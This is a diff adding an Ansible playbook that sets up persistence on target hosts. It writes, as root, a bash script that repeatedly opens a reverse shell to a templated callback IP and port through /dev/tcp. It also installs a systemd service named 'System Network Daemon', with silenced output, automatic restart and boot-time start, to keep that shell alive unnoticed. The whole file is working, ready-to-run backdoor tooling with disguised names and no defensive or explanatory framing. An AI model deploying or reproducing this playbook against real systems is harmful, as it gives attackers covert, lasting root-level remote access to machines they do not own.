@@ -1,0 +1,56 @@
+# playbooks/systemd_service_persistence.yml
+---
+- name: Systemd Service Persistence
+  hosts: targets
+  become: yes
+  gather_facts: no
+
+  tasks:
+
+    - name: Deploy payload script
+      copy:
+        dest: /usr/local/lib/sys-net-daemon.sh
+        mode: '0755'
+        owner: root
+        group: root
+        content: |
+          #!/bin/bash
+          while true; do
+            if ! pgrep -f "{{ callback_ip }}:{{ callback_port }}" > /dev/null 2>&1; then
+              bash -i >& /dev/tcp/{{ callback_ip }}/{{ callback_port }} 0>&1
+            fi
+            sleep 300
+          done
+
+    - name: Create systemd service unit
+      copy:
+        dest: /etc/systemd/system/sys-net-daemon.service
+        mode: '0644'
+        owner: root
+        group: root
+        content: |
+          [Unit]
+          Description=System Network Daemon
+          After=network.target
+          StartLimitIntervalSec=0
+
+          [Service]
+          Type=simple
+          ExecStart=/usr/local/lib/sys-net-daemon.sh
+          Restart=always
+          RestartSec=30s
+          StandardOutput=null
+          StandardError=null
+
+          [Install]
+          WantedBy=multi-user.target
+
+    - name: Reload systemd daemon
+      systemd:
+        daemon_reload: yes
+
+    - name: Enable and start the service
+      systemd:
+        name: sys-net-daemon.service
+        enabled: yes
+        state: started
